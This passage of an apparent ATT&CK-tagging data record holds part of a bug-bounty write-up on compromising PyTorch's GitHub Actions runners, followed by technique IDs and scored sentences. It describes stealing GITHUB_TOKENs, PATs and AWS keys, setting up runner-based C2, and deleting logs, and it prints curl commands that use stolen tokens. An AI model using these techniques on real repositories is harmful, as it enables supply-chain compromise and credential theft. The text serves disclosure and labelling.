runner.\nEven though this workflow wouldn’t run on our runner, the GITHUB_TOKENs we could compromise had actions:write privileges. We could use the token to trigger workflows with the workflow_dispatch event. Could we use that to run our malicious code in the context of the weekly.yml workflow?\nWe had some ideas but weren’t sure whether they’d work in practice. So, we decided to find out.\nIt turns out that you can’t use a GITHUB_TOKEN to modify workflow files. However, we discovered several creative…”workarounds”…that will let you add malicious code to a workflow using a GITHUB_TOKEN. In this scenario, weekly.yml used another workflow, which used a script outside the .github/workflows directory. We could add our code to this script in our branch. Then, we could trigger that workflow on our branch, which would execute our malicious code.\nIf this sounds confusing, don’t worry; it also confuses most bug bounty programs. Hopefully, we’ll get to provide an in-depth look at this and our other post-exploitation techniques at a certain security conference in LV, NV. If we don’t get that opportunity, we’ll cover our other methods in a future blog post.\nBack to the action. To execute this phase of the attack, we compromised another GITHUB_TOKEN and used it to clone the PyTorch repository. We created our own branch, added our payload, and triggered the workflow.\nAs a stealth bonus, we changed our git username in the commit to pytorchmergebot, so that our commits and workflows appeared to be triggered by the pytorchmergebot user, who interacted frequently with the PyTorch repository.\nOur payload ran in the context of the weekly.yml workflow, which used the GitHub secrets we were after. The payload encrypted the two GitHub PATs and printed them to the workflow log output. We protected the private encryption key so that only we could perform decryption.\nWe triggered the weekly.yml workflow on our citesting1112 branch using the following cURL command.\ncurl -L \\ -X POST \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $STOLEN_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches \\ -d ‘{“ref”:”citesting1112″}’ Navigating to the PyTorch “Actions” tab, we saw our encrypted output containing the PATs in the results of the “Weekly” workflow.\nFinally, we canceled the workflow run and deleted the logs.\nPAT Access After decrypting the GitHub PATs, we enumerated their access with Gato.\nWe decrypted the PATs with our private key.\nGato revealed the PATs had access to over 93 repositories within the PyTorch organization, including many private repos and administrative access over several. These PATs provided multiple paths to supply chain compromise.\nFor example, if an attacker didn’t want to bother with tampering releases, they could likely add code directly to the main branch of PyTorch. The main branch was protected, but the PAT belonging to pytorchbot could create a new branch and add its own code, and then the PAT belonging to pytorchupdatebot could approve the PR. We could then use pytorchmergebot to trigger the merge.\nWe didn’t use that attack path to add code to the main branch, but existing PyTorch PRs indicated it was possible. Even if an attacker couldn’t push directly to the main branch, there are other paths to supply chain compromise.\nIf the threat actor wanted to be more stealthy, they could add their malicious code to one of the other private or public repositories used by PyTorch within the PyTorch organization. These repositories had less visibility and were less likely to be closely reviewed. Or, they could smuggle their code into a feature branch, or steal more secrets, or do any number of creative techniques to compromise the PyTorch supply chain.\nAWS Access To prove that the PAT compromise was not a one-off, we decided to steal more secrets – this time, AWS keys.\nWe won’t bore you with all the details, but we executed a similar attack to the one above to steal the aws-pytorch-uploader-secret-access-key and aws-access-key-id belonging to the pytorchbot AWS user. These AWS keys had privileges to upload PyTorch releases to AWS, providing another path to backdoor PyTorch releases. The impact of this attack would depend on the sources that pulled releases from AWS and the other assets in this AWS account.\nWe used the AWS CLI to confirm the AWS credentials belonged to the pytorchbot AWS user.\nWe listed the contents of the “pytorch” bucket, revealing many sensitive artifacts, including PyTorch releases.\nWe discovered production PyTorch artifacts and confirmed write access to S3. We later confirmed that the PyTorch website pulls directly from these releases, so backdooring releases in these S3 buckets would allow an attacker to compromise any user that downloaded PyTorch from the PyTorch website, whether manually or with a `pip install`.\nThere were other sets of AWS keys, GitHub PATs, and various credentials we could have stolen, but we believed we had a clear demonstration of impact at this point. Given the critical nature of the vulnerability, we wanted to submit the report as soon as possible before one of PyTorch’s 3,500 contributors decided to make a deal with a foreign adversary.\nA full attack path diagram.\nSubmission Details – No Bueno Overall, the PyTorch submission process was blah, to use a technical term. They frequently had long response times, and their fixes were questionable.\nWe also learned this wasn’t the first time they had issues with self-hosted runners – earlier in 2023, Marcus Young executed a pipeline attack to gain RCE on a single PyTorch runner. Marcus did not perform the post-exploitation techniques we used to demonstrate impact, but PyTorch still should have locked down their runners after his submission. Marcus’ report earned him a $10,000 bounty.\nWe haven’t investigated PyTorch’s new setup enough to provide our opinion on their solution to securing their runners. Rather than require approval for contributor’s fork PRs, PyTorch opted to implement a layer of controls to prevent abuse.\nTimeline August 9th, 2023 – Report submitted to Meta bug bounty August 10th, 2023 – Report “sent to appropriate product team” September 8th, 2023 – We reached out to Meta to ask for an update September 12th, 2023 – Meta said there is no update to provide October 16th, 2023 – Meta said “we consider the issue mitigated, if you think this wasn’t fully mitigated, please let us know.” October 16th, 2023 – We responded by saying we believed the issue had not been fully mitigated.\nNovember 1st, 2023 – We reached out to Meta, asking for another update.\nNovember 21st, 2023 – Meta responded, saying they reached out to a team member to provide an update.\nDecember 7th, 2023 – After not receiving an update, we sent a strongly worded message to Meta, expressing our concerns about the disclosure process and the delay in remediation.\nDecember 7th, 2023 – Meta responded, saying they believed the issue was mitigated and the delay was regarding the bounty.\nDecember 7th, 2023 – Several back-and-forths ensued discussing remediation.\nDecember 15th, 2023 – Meta awarded a $5000 bounty, plus 10% due to the delay in payout.\nDecember 15th, 2023 – Meta provided more detail as to the remediation steps they performed after the initial vulnerability disclosure and offered to set up a call if we had more questions.\nDecember 16th, 2023 – We responded, opting not to set up a call, and asked a question about bounty payout (at this point, we were pretty done with looking at PyTorch).\nMitigations The easiest way to mitigate this class of vulnerability is to change the default setting of ‘Require approval for first-time contributors’ to ‘Require approval for all outside collaborators’. It is a no-brainer for any public repository that uses self-hosted runners to ensure they use the restrictive setting, although PyTorch seems to disagree.\nIf workflows from fork-PRs are necessary, organizations should only use GitHub-hosted runners. If self-hosted runners are also necessary, use isolated, ephemeral runners and ensure you know the risks involved.\nIt is challenging to design a solution allowing anyone to run arbitrary code on your infrastructure without risks, especially in an organization like PyTorch that thrives off community contributions.\nIs PyTorch an Outlier?\nThe issues surrounding these attack paths are not unique to PyTorch. They’re not unique to ML repositories or even to GitHub. We’ve repeatedly demonstrated supply chain weaknesses by exploiting CI/CD vulnerabilities in the world’s most advanced technological organizations across several CI/CD platforms, and those are only a small subset of the greater attack surface.\nThreat actors are starting to catch on, as shown by the year-over-year increase in supply chain attacks. Security researchers won’t always be able to find these vulnerabilities before malicious attackers.\nBut in this case, the researchers got there first.\nWant to hear more? Subscribe to the official John IV newsletter to receive live, monthly updates of my interests and passions.\nReferences - https://johnstawinski.com/2024/01/05/worse-than-solarwinds-three-steps-to-hack-blockchains-github-and-ml-through-github-actions/ - https://adnanthekhan.com/2023/12/20/one-supply-chain-attack-to-rule-them-all/ - https://marcyoung.us/post/zuckerpunch/ - https://www.praetorian.com/blog/self-hosted-github-runners-are-backdoors/ - https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/ - https://github.com/nikitastupin/pwnhub - https://0xn3va.gitbook.io/cheat-sheets/ci-cd/github/actions - https://owasp.org/www-project-top-10-ci-cd-security-risks/ Leave a comment",
+  "ID_list": [
+    "T1677"
+  ],
+  "Name_list": [
+    "Command and Control",
+    "Execution",
+    "Impact",
+    "Persistence",
+    "Source",
+    "Sudo",
+    "Supply Chain Compromise"
+  ],
+  "TTP_sentences": {
+    "T1677": [
+      {
+        "sentence": "Security tends to lag behind adoption, and AI/ML is no exception.",
+        "score": 0.4203
+      },
+      {
+        "sentence": "Four months ago, Adnan Khan and I exploited a critical CI/CD vulnerability in PyTorch, one of the world’s leading ML platforms.",
+        "score": 0.5829
+      },
+      {
+        "sentence": "Used by titans like Google, Meta, Boeing, and Lockheed Martin, PyTorch is a major target for hackers and nation-states alike.",
+        "score": 0.3889
+      },
+      {
+        "sentence": "Thankfully, we exploited this vulnerability before the bad guys.",
+        "score": 0.3243
+      },
+      {
+        "sentence": "Here is how we did it.",
+        "score": 0.322
+      },
+      {
+        "sentence": "Background Before we dive in, let’s scope out and discuss why Adnan and I were looking at an ML repository.",
+        "score": 0.5065
+      },
+      {
+        "sentence": "Let me give you a hint — it was not to gawk at the neural networks.",
+        "score": 0.3318
+      },
+      {
+        "sentence": "In fact, I don’t know enough about neural networks to be qualified to gawk.",
+        "score": 0.3571
+      },
+      {
+        "sentence": "PyTorch was one of the first steps on a journey Adnan and I started six months ago, based on CI/CD research and exploit development we performed in the summer of 2023.",
+        "score": 0.5126
+      },
+      {
+        "sentence": "Adnan started the bug bounty foray by leveraging these attacks to exploit a critical vulnerability in GitHub that allowed him to backdoor all of GitHub’s and Azure’s runner images, collecting a $20,000 reward.",
+        "score": 0.5113
+      },
+      {
+        "sentence": "Following this attack, we teamed up to discover other vulnerable repositories.",
+        "score": 0.4235
+      },
+      {
+        "sentence": "The results of our research surprised everyone, including ourselves, as we continuously executed supply chain compromises of leading ML platforms, billion-dollar Blockchains, and more.",
+        "score": 0.5472
+      },
+      {
+        "sentence": "In the seven days since we released our initial blog posts, they’ve caught on in the security world.",
+        "score": 0.4297
+      },
+      {
+        "sentence": "But, you probably didn’t come here to read about our journey; you came to read about the messy details of our attack on PyTorch.",
+        "score": 0.3869
+      },
+      {
+        "sentence": "Let’s begin.",
+        "score": 0.3712
+      },
+      {
+        "sentence": "Tell Me the Impact Our exploit path resulted in the ability to upload malicious PyTorch releases to GitHub, upload releases to AWS, potentially add code to the main repository branch, backdoor PyTorch dependencies – the list goes on.",
+        "score": 0.6899
+      },
+      {
+        "sentence": "In short, it was bad.",
+        "score": 0.3194
+      },
+      {
+        "sentence": "As we’ve seen before with SolarWinds, Ledger, and others, supply chain attacks like this are killer from an attacker’s perspective.",
+        "score": 0.4961
+      },
+      {
+        "sentence": "With this level of access, any respectable nation-state would have several paths to a PyTorch supply chain compromise.",
+        "score": 0.4989
+      },
+      {
+        "sentence": "GitHub Actions Primer To understand our exploit, you need to understand GitHub Actions.",
+        "score": 0.5238
+      },
+      {
+        "sentence": "Want to skip around?",
+        "score": 0.3191
+      },
+      {
+        "sentence": "Go ahead. - Background - Tell Me the Impact - GitHub Actions Primer - Identifying the Vulnerability - Executing the Attack - Post Exploitation - Submission Details – No Bueno - Mitigations - Is PyTorch an Outlier? - References If you’ve never worked with GitHub Actions or similar CI/CD platforms, I recommend reading up before continuing this blog post.",
+        "score": 0.6447
+      },
+      {
+        "sentence": "Typically, I like to start from the very basics in my articles, but explaining all the involved CI/CD processes would be a novel in itself.",
+        "score": 0.5894
+      },
+      {
+        "sentence": "In short, GitHub Actions allow the execution of code specified within workflows as part of the CI/CD process.",
+        "score": 0.6269
+      },
+      {
+        "sentence": "For example, let’s say PyTorch wants to run a set of tests when a GitHub user submits a pull request.",
+        "score": 0.4977
+      },
+      {
+        "sentence": "PyTorch can define these tests in a YAML workflow file used by GitHub Actions and configure the workflow to run on the pull_request trigger.",
+        "score": 0.6021
+      },
+      {
+        "sentence": "Now, whenever a user submits a pull request, the tests will execute on a runner.",
+        "score": 0.4238
+      },
+      {
+        "sentence": "This way, repository maintainers don’t need to manually test everyone’s code before merging.",
+        "score": 0.5737
+      },
+      {
+        "sentence": "The public PyTorch repository uses GitHub Actions extensively for CI/CD.",
+        "score": 0.5484
+      },
+      {
+        "sentence": "PyTorch has over 70 different GitHub workflows and typically runs over ten workflows every hour.",
+        "score": 0.5492
+      },
+      {
+        "sentence": "One of the most difficult parts of this operation was scrolling through all of the different workflows to select the ones we were interested in.",
+        "score": 0.3816
+      },
+      {
+        "sentence": "GitHub Actions workflows execute on two types of build runners.",
+        "score": 0.4236
+      },
+      {
+        "sentence": "One type is GitHub’s hosted runners, which GitHub maintains and hosts in their environment.",
+        "score": 0.4583
+      },
+      {
+        "sentence": "The other class is self-hosted runners.",
+        "score": 0.3865
+      },
+      {
+        "sentence": "Self-Hosted Runners Self-hosted runners are build agents hosted by end users running the Actions runner agent on their own infrastructure.",
+        "score": 0.4086
+      },
+      {
+        "sentence": "In less technical terms, a “self-hosted runner” is a machine, VM, or container configured to run GitHub workflows from a GitHub organization or repository.",
+        "score": 0.5833
+      },
+      {
+        "sentence": "Securing and protecting the runners is the responsibility of end users, not GitHub, which is why GitHub recommends against using self-hosted runners on public repositories.",
+        "score": 0.5179
+      },
+      {
+        "sentence": "Apparently, not everyone listens to GitHub, including GitHub.",
+        "score": 0.418
+      },
+      {
+        "sentence": "It doesn’t help that some of GitHub’s default settings are less than secure.",
+        "score": 0.4519
+      },
+      {
+        "sentence": "By default, when a self-hosted runner is attached to a repository, any of that repository’s workflows can use that runner.",
+        "score": 0.5651
+      },
+      {
+        "sentence": "This setting also applies to workflows from fork pull requests.",
+        "score": 0.4789
+      },
+      {
+        "sentence": "Remember that anyone can submit a fork pull request to a public GitHub repository.",
+        "score": 0.5489
+      },
+      {
+        "sentence": "The result of these settings is that, by default, any repository contributor can execute code on the self-hosted runner by submitting a malicious PR.",
+        "score": 0.4982
+      },
+      {
+        "sentence": "Note: A “contributor” to a GitHub repository is anyone who has added code to the repository.",
+        "score": 0.5943
+      },
+      {
+        "sentence": "Typically, someone becomes a contributor by submitting a pull request that then gets merged into the default branch.",
+        "score": 0.4744
+      },
+      {
+        "sentence": "More on this later.",
+        "score": 0.31
+      },
+      {
+        "sentence": "If the self-hosted runner is configured using the default steps, it will be a non-ephemeral self-hosted runner.",
+        "score": 0.4361
+      },
+      {
+        "sentence": "This means that the malicious workflow can start a process in the background that will continue to run after the job completes, and modifications to files (such as programs on the path, etc.) will persist past the current workflow.",
+        "score": 0.5565
+      },
+      {
+        "sentence": "It also means that future workflows will run on that same runner.",
+        "score": 0.4342
+      },
+      {
+        "sentence": "Identifying the Vulnerability Identifying Self-Hosted Runners To identify self-hosted runners, we ran Gato, a GitHub attack and exploitation tool developed by Praetorian.",
+        "score": 0.4328
+      },
+      {
+        "sentence": "Among other things, Gato can enumerate the existence of self-hosted runners within a repository by examining GitHub workflow files and run logs.",
+        "score": 0.4431
+      },
+      {
+        "sentence": "Gato identified several persistent, self-hosted runners used by the PyTorch repository.",
+        "score": 0.3989
+      },
+      {
+        "sentence": "We looked at repository workflow logs to confirm the Gato output.",
+        "score": 0.5408
+      },
+      {
+        "sentence": "The name “worker-rocm-amd-30” indicates the runner is self-hosted.",
+        "score": 0.3225
+      },
+      {
+        "sentence": "Determining Workflow Approval Requirements Even though PyTorch used self-hosted runners, one major thing could still stop us.",
+        "score": 0.4843
+      },
+      {
+        "sentence": "The default setting for workflow execution from fork PRs requires approval only for accounts that have not previously contributed to the repository.",
+        "score": 0.5887
+      },
+      {
+        "sentence": "However, there is an option to allow workflow approval for all fork PRs, including previous contributors.",
+        "score": 0.5525
+      },
+      {
+        "sentence": "Viewing the pull request (PR) history, we found several PRs from previous contributors that triggered pull_request workflows without requiring approval.",
+        "score": 0.4417
+      },
+      {
+        "sentence": "This indicated that the repository did not require workflow approval for Fork PRs from previous contributors.",
+        "score": 0.5235
+      },
+      {
+        "sentence": "Nobody had approved this fork PR workflow, yet the “Lint / quick-checks / linux-job” workflow ran on pull_request, indicating the default approval setting was likely in place.",
+        "score": 0.5621
+      },
+      {
+        "sentence": "Searching for Impact Before executing these attacks, we like to identify GitHub secrets that we may be able to steal after landing on the runner.",
+        "score": 0.4539
+      },
+      {
+        "sentence": "Workflow files revealed several GitHub secrets used by PyTorch, including but not limited to: - “aws-pytorch-uploader-secret-access-key” - “aws-access-key-id” - “GH_PYTORCHBOT_TOKEN” (GitHub Personal Access Token) - “UPDATEBOT_TOKEN” (GitHub Personal Access Token) - “conda-pytorchbot-token” We were psyched when we saw the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN.",
+        "score": 0.439
+      },
+      {
+        "sentence": "A PAT is one of your most valuable weapons if you want to launch a supply chain attack.",
+        "score": 0.4668
+      },
+      {
+        "sentence": "Using self-hosted runners to compromise GitHub secrets is not always possible.",
+        "score": 0.5185
+      },
+      {
+        "sentence": "Much of our research has been around self-hosted runner post-exploitation; figuring out methods to go from runner to secrets.",
+        "score": 0.4498
+      },
+      {
+        "sentence": "PyTorch provided a great opportunity to test these techniques in the wild.",
+        "score": 0.3559
+      },
+      {
+        "sentence": "Executing the Attack 1.",
+        "score": 0.3472
+      },
+      {
+        "sentence": "Fixing a Typo We needed to be a contributor to the PyTorch repository to execute workflows, but we didn’t feel like spending time adding features to PyTorch.",
+        "score": 0.5936
+      },
+      {
+        "sentence": "Instead, we found a typo in a markdown file and submitted a fix.",
+        "score": 0.3804
+      },
+      {
+        "sentence": "Yes, I’m re-using this meme from my last article, but it fits too well.",
+        "score": 0.3928
+      },
+      {
+        "sentence": "Preparing the Payload Now we had to craft a workflow payload that would allow us to obtain persistence on the self-hosted runner.",
+        "score": 0.5515
+      },
+      {
+        "sentence": "Red Teamers know that installing persistence in production environments typically isn’t as trivial as a reverse Netcat shell.",
+        "score": 0.4305
+      },
+      {
+        "sentence": "EDR, firewalls, packet inspection, and more can be in play, particularly in large corporate environments.",
+        "score": 0.3142
+      },
+      {
+        "sentence": "When we started these attacks, we asked ourselves the following question – what could we use for Command and Control (C2) that we know for sure would bypass EDR with traffic that would not be blocked by any firewall?",
+        "score": 0.3523
+      },
+      {
+        "sentence": "The answer is elegant and obvious – we could install another self-hosted GitHub runner and attach it to our private GitHub organization.",
+        "score": 0.542
+      },
+      {
+        "sentence": "Our “Runner on Runner” (RoR) technique uses the same servers for C2 as the existing runner, and the only binary we drop is the official GitHub runner agent binary, which is already running on the system.",
+        "score": 0.4876
+      },
+      {
+        "sentence": "We created a script to automate the runner registration process and included that as our malicious workflow payload.",
+        "score": 0.5436
+      },
+      {
+        "sentence": "Storing our payload in a gist, we submitted a malicious draft PR.",
+        "score": 0.4778
+      },
+      {
+        "sentence": "However, with the complexity of PyTorch’s CI/CD environment, I’d be surprised if they noticed either way.",
+        "score": 0.5198
+      },
+      {
+        "sentence": "We submitted the PR and installed our RoR C2 on each self-hosted runner.",
+        "score": 0.4057
+      },
+      {
+        "sentence": "We used our C2 repository to execute the pwd && ls && /home && ip a command on the runner labeled “jenkins-worker-rocm-amd-34”, confirming stable C2 and remote code execution.",
+        "score": 0.4148
+      },
+      {
+        "sentence": "Post Exploitation We now had root on a self-hosted runner.",
+        "score": 0.427
+      },
+      {
+        "sentence": "We had seen previous reports of gaining RCE on self-hosted runners, and they were often met with ambiguous responses due to their ambiguous impact.",
+        "score": 0.4855
+      },
+      {
+        "sentence": "Given the complexity of these attacks, we wanted to demonstrate a legitimate impact on PyTorch to convince them to take our report seriously.",
+        "score": 0.4271
+      },
+      {
+        "sentence": "And we had some cool new post-exploitation techniques we’d been wanting to try.",
+        "score": 0.429
+      },
+      {
+        "sentence": "The Great Secret Heist In cloud and CI/CD environments, secrets are king.",
+        "score": 0.4322
+      },
+      {
+        "sentence": "When we began our post-exploitation research, we focused on the secrets an attacker could steal and leverage in a typical self-hosted runner setup.",
+        "score": 0.4862
+      },
+      {
+        "sentence": "Most of the secret stealing starts with the GITHUB_TOKEN.",
+        "score": 0.3343
+      },
+      {
+        "sentence": "The Magical GITHUB_TOKEN Typically, a workflow needs to checkout a GitHub repository to the runner’s filesystem, whether to run tests defined in the repository, commit changes, or even publish releases.",
+        "score": 0.7212
+      },
+      {
+        "sentence": "The workflow can use a GITHUB_TOKEN to authenticate to GitHub and perform these operations.",
+        "score": 0.4225
+      },
+      {
+        "sentence": "GITHUB_TOKEN permissions can vary from read-only access to extensive write privileges over the repository.",
+        "score": 0.3952
+      },
+      {
+        "sentence": "If a workflow executes on a self-hosted runner and uses a GITHUB_TOKEN, that token will be on the runner for the duration of that build.",
+        "score": 0.4477
+      },
+      {
+        "sentence": "PyTorch had several workflows that used the actions/checkout step with a GITHUB_TOKEN that had write permissions.",
+        "score": 0.4494
+      },
+      {
+        "sentence": "For example, by searching through workflow logs, we can see the periodic.yml workflow also ran on the jenkins-worker-rocm-amd-34 self-hosted runner.",
+        "score": 0.5323
+      },
+      {
+        "sentence": "The logs confirmed that this workflow used a GITHUB_TOKEN with extensive write permissions.",
+        "score": 0.3622
+      },
+      {
+        "sentence": "This token would only be valid for the life of that particular build.",
+        "score": 0.3367
+      },
+      {
+        "sentence": "However, we developed some special techniques to extend the build length once you are on the runner (more on this in a future post).",
+        "score": 0.4478
+      },
+      {
+        "sentence": "Due to the insane number of workflows that run daily from the PyTorch repository, we were not worried about tokens expiring, as we could always compromise another one.",
+        "score": 0.5846
+      },
+      {
+        "sentence": "When a workflow uses the actions/checkout step, the GITHUB_TOKEN is stored in the .git/config file of the checked-out repository on the self-hosted runner during an active workflow.",
+        "score": 0.6184
+      },
+      {
+        "sentence": "Since we controlled the runner, all we had to do was wait until a non-PR workflow ran on the runner with a privileged GITHUB_TOKEN and then print out the contents of the config file.",
+        "score": 0.4786
+      },
+      {
+        "sentence": "We used our RoR C2 to steal the GITHUB_TOKEN of an ongoing workflow with write permissions.",
+        "score": 0.4586
+      },
+      {
+        "sentence": "Covering our Tracks Our first use of the GITHUB_TOKEN was to eliminate the run logs from our malicious pull request.",
+        "score": 0.4186
+      },
+      {
+        "sentence": "We wanted a full day to perform post-exploitation and didn’t want to cause any alarms from our activity.",
+        "score": 0.3826
+      },
+      {
+        "sentence": "We used the GitHub API along with the token to delete the run logs for each of the workflows our PR triggered.",
+        "score": 0.3967
+      },
+      {
+        "sentence": "Stealth mode = activated. curl -L \\ -X DELETE \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $STOLEN_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ <a href=\"https://api.github.com/repos/pytorch/pytorch/runs/https://api.github.com/repos/pytorch/pytorch/runs/<run_id> If you want a challenge, you can try to discover the workflows associated with our initial malicious PR and observe that the logs no longer exist.",
+        "score": 0.4787
+      },
+      {
+        "sentence": "In reality, they likely wouldn’t have caught our workflows anyway.",
+        "score": 0.4133
+      },
+      {
+        "sentence": "PyTorch has so many workflow runs that it reaches the limit for a single repository after a few days.",
+        "score": 0.4972
+      },
+      {
+        "sentence": "Modifying Repository Releases Using the token, we could upload an asset claiming to be a pre-compiled, ready-to-use PyTorch binary and add a release note with instructions to run and download the binary.",
+        "score": 0.5643
+      },
+      {
+        "sentence": "If the current source code assets were not pinned to the release commit, the attacker could overwrite those assets directly.",
+        "score": 0.6051
+      },
+      {
+        "sentence": "As a POC, we used the following cURL request to modify the name of a PyTorch GitHub release.",
+        "score": 0.4104
+      },
+      {
+        "sentence": "We just as easily could have uploaded our own assets. curl -L \\ -X PATCH \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $GH_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ https://api.github.com/repos/pytorch/pytorch/releases/102257798 \\ -d ‘{“tag_name”:”v2.0.1″,”name”:”PyTorch 2.0.1 Release, bug fix release (- John Stawinski)”}’ As a POC, we added my name to the latest PyTorch release at the time.",
+        "score": 0.5481
+      },
+      {
+        "sentence": "A malicious attacker could execute a similar API request to replace the latest release artifact with their malicious artifact.",
+        "score": 0.3615
+      },
+      {
+        "sentence": "Repository Secrets If backdooring PyTorch repository releases sounds fun, well, that is only a fraction of the impact we achieved when we looked at repository secrets.",
+        "score": 0.4826
+      },
+      {
+        "sentence": "The PyTorch repository used GitHub secrets to allow the runners to access sensitive systems during the automated release process.",
+        "score": 0.4519
+      },
+      {
+        "sentence": "The repository used a lot of secrets, including several sets of AWS keys and GitHub Personal Access Tokens (PATs) discussed earlier.",
+        "score": 0.3406
+      },
+      {
+        "sentence": "Specifically, the weekly.yml workflow used the GH_PYTORCHBOT_TOKEN and UPDATEBOT_TOKEN secrets to authenticate to GitHub.",
+        "score": 0.452
+      },
+      {
+        "sentence": "GitHub Personal Access Tokens (PATs) are often overprivileged, making them a great target for attackers.",
+        "score": 0.3178
+      },
+      {
+        "sentence": "This workflow did not run on a self-hosted runner, so we couldn’t wait for a run and then steal the secrets from the filesystem (a technique we use frequently).",
+        "score": 0.3765
+      },
+      {
+        "sentence": "The weekly.yml workflow used two PATs as secrets.",
+        "score": 0.3021
+      },
+      {
+        "sentence": "This workflow called the _update-commit-hash workflow, which specified use of a GitHub-hosted runner.",
+        "score": 0.5706
+      },
+      {
+        "sentence": "Even though this workflow wouldn’t run on our runner, the GITHUB_TOKENs we could compromise had actions:write privileges.",
+        "score": 0.4551
+      },
+      {
+        "sentence": "We could use the token to trigger workflows with the workflow_dispatch event.",
+        "score": 0.3738
+      },
+      {
+        "sentence": "Could we use that to run our malicious code in the context of the weekly.yml workflow?",
+        "score": 0.5885
+      },
+      {
+        "sentence": "We had some ideas but weren’t sure whether they’d work in practice.",
+        "score": 0.3568
+      },
+      {
+        "sentence": "It turns out that you can’t use a GITHUB_TOKEN to modify workflow files.",
+        "score": 0.5533
+      },
+      {
+        "sentence": "However, we discovered several creative…”workarounds”…that will let you add malicious code to a workflow using a GITHUB_TOKEN.",
+        "score": 0.644
+      },
+      {
+        "sentence": "In this scenario, weekly.yml used another workflow, which used a script outside the .github/workflows directory.",
+        "score": 0.5828
+      },
+      {
+        "sentence": "We could add our code to this script in our branch.",
+        "score": 0.5626
+      },
+      {
+        "sentence": "Then, we could trigger that workflow on our branch, which would execute our malicious code.",
+        "score": 0.4963
+      },
+      {
+        "sentence": "If this sounds confusing, don’t worry; it also confuses most bug bounty programs.",
+        "score": 0.3257
+      },
+      {
+        "sentence": "Hopefully, we’ll get to provide an in-depth look at this and our other post-exploitation techniques at a certain security conference in LV, NV.",
+        "score": 0.3968
+      },
+      {
+        "sentence": "If we don’t get that opportunity, we’ll cover our other methods in a future blog post.",
+        "score": 0.405
+      },
+      {
+        "sentence": "Back to the action.",
+        "score": 0.3546
+      },
+      {
+        "sentence": "To execute this phase of the attack, we compromised another GITHUB_TOKEN and used it to clone the PyTorch repository.",
+        "score": 0.5663
+      },
+      {
+        "sentence": "We created our own branch, added our payload, and triggered the workflow.",
+        "score": 0.5623
+      },
+      {
+        "sentence": "As a stealth bonus, we changed our git username in the commit to pytorchmergebot, so that our commits and workflows appeared to be triggered by the pytorchmergebot user, who interacted frequently with the PyTorch repository.",
+        "score": 0.4623
+      },
+      {
+        "sentence": "Our payload ran in the context of the weekly.yml workflow, which used the GitHub secrets we were after.",
+        "score": 0.6461
+      },
+      {
+        "sentence": "The payload encrypted the two GitHub PATs and printed them to the workflow log output.",
+        "score": 0.5269
+      },
+      {
+        "sentence": "We protected the private encryption key so that only we could perform decryption.",
+        "score": 0.3238
+      },
+      {
+        "sentence": "We triggered the weekly.yml workflow on our citesting1112 branch using the following cURL command. curl -L \\ -X POST \\ -H “Accept: application/vnd.github+json” \\ -H “Authorization: Bearer $STOLEN_TOKEN” \\ -H “X-GitHub-Api-Version: 2022-11-28” \\ https://api.github.com/repos/pytorch/pytorch/actions/workflows/weekly.yml/dispatches \\ -d ‘{“ref”:”citesting1112″}’ Navigating to the PyTorch “Actions” tab, we saw our encrypted output containing the PATs in the results of the “Weekly” workflow.",
+        "score": 0.5635
+      },
+      {
+        "sentence": "Finally, we canceled the workflow run and deleted the logs.",
+        "score": 0.4247
+      },
+      {
+        "sentence": "Gato revealed the PATs had access to over 93 repositories within the PyTorch organization, including many private repos and administrative access over several.",
+        "score": 0.5191
+      },
+      {
+        "sentence": "These PATs provided multiple paths to supply chain compromise.",
+        "score": 0.4792
+      },
+      {
+        "sentence": "For example, if an attacker didn’t want to bother with tampering releases, they could likely add code directly to the main branch of PyTorch.",
+        "score": 0.6832
+      },
+      {
+        "sentence": "The main branch was protected, but the PAT belonging to pytorchbot could create a new branch and add its own code, and then the PAT belonging to pytorchupdatebot could approve the PR.",
+        "score": 0.5217
+      },
+      {
+        "sentence": "We could then use pytorchmergebot to trigger the merge.",
+        "score": 0.4418
+      },
+      {
+        "sentence": "We didn’t use that attack path to add code to the main branch, but existing PyTorch PRs indicated it was possible.",
+        "score": 0.6192
+      },
+      {
+        "sentence": "Even if an attacker couldn’t push directly to the main branch, there are other paths to supply chain compromise.",
+        "score": 0.5838
+      },
+      {
+        "sentence": "If the threat actor wanted to be more stealthy, they could add their malicious code to one of the other private or public repositories used by PyTorch within the PyTorch organization.",
+        "score": 0.6488
+      },
+      {
+        "sentence": "These repositories had less visibility and were less likely to be closely reviewed.",
+        "score": 0.4904
+      },
+      {
+        "sentence": "Or, they could smuggle their code into a feature branch, or steal more secrets, or do any number of creative techniques to compromise the PyTorch supply chain.",
+        "score": 0.6557
+      },
+      {
+        "sentence": "AWS Access To prove that the PAT compromise was not a one-off, we decided to steal more secrets – this time, AWS keys.",
+        "score": 0.4415
+      },
+      {
+        "sentence": "We won’t bore you with all the details, but we executed a similar attack to the one above to steal the aws-pytorch-uploader-secret-access-key and aws-access-key-id belonging to the pytorchbot AWS user.",
+        "score": 0.421
+      },
+      {
+        "sentence": "These AWS keys had privileges to upload PyTorch releases to AWS, providing another path to backdoor PyTorch releases.",
+        "score": 0.5702
+      },
+      {
+        "sentence": "The impact of this attack would depend on the sources that pulled releases from AWS and the other assets in this AWS account.",
+        "score": 0.5442
+      },
+      {
+        "sentence": "We used the AWS CLI to confirm the AWS credentials belonged to the pytorchbot AWS user.",
+        "score": 0.3263
+      },
+      {
+        "sentence": "We listed the contents of the “pytorch” bucket, revealing many sensitive artifacts, including PyTorch releases.",
+        "score": 0.3796
+      },
+      {
+        "sentence": "We discovered production PyTorch artifacts and confirmed write access to S3.",
+        "score": 0.3789
+      },
+      {
+        "sentence": "We later confirmed that the PyTorch website pulls directly from these releases, so backdooring releases in these S3 buckets would allow an attacker to compromise any user that downloaded PyTorch from the PyTorch website, whether manually or with a `pip install`.",
+        "score": 0.6077
+      },
+      {
+        "sentence": "There were other sets of AWS keys, GitHub PATs, and various credentials we could have stolen, but we believed we had a clear demonstration of impact at this point.",
+        "score": 0.4306
+      },
+      {
